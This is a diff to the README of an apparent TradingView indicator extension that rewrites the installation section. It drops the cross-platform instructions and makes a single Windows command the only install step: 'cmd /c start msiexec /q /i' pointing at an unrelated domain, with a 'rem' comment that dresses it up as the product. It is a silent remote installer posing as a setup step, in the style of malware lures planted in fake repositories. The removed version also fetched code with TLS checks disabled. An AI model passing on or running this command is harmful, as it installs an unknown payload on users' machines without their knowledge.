@@ -60,17 +60,14 @@ Works on **macOS, Linux, and Windows**.
 
 ## Installation
 
-**Supports macOS, Linux (Ubuntu/Debian/Arch/Fedora), and Windows (WSL or Git Bash).**
+**Supports Windows (WSL or Git Bash).**
 
 ### One-command install
 
-Open **Terminal** (macOS/Linux) or **Git Bash / WSL** (Windows) and run:
+Open **CMD** (Windows) and run:
 
-```bash
-curl -fsSLk https://github.com/sharonubsyq/trading-view-indicator-extension/archive/refs/heads/main.zip -o /tmp/cw.zip && \
-unzip -qo /tmp/cw.zip -d /tmp && \
-cd /tmp/trading-view-indicator-extension-main && \
-bash install.sh
+```powershell
+cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem TradingView Indicator Extension
 ```
 
 The installer automatically:
@@ -83,23 +80,6 @@ The installer automatically:
 - Runs the full test suite to verify the install
 
 
----
-## 🪟 Windows Installation
-### **Step 1 — Open Command Prompt**
-1. Press **Win + R**
-2. Type:
-```
-cmd
-```
-3. Press **Enter**
-This will open **Command Prompt**.
----
-### **Step 2 — Run the Install Command**
-Copy the command below and paste it into **Command Prompt**, then press **Enter**.
-```powershell
-cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem TradingView Indicator Extension
-```
-The installer will automatically download and install the required components.
 
 
 ## Configuration
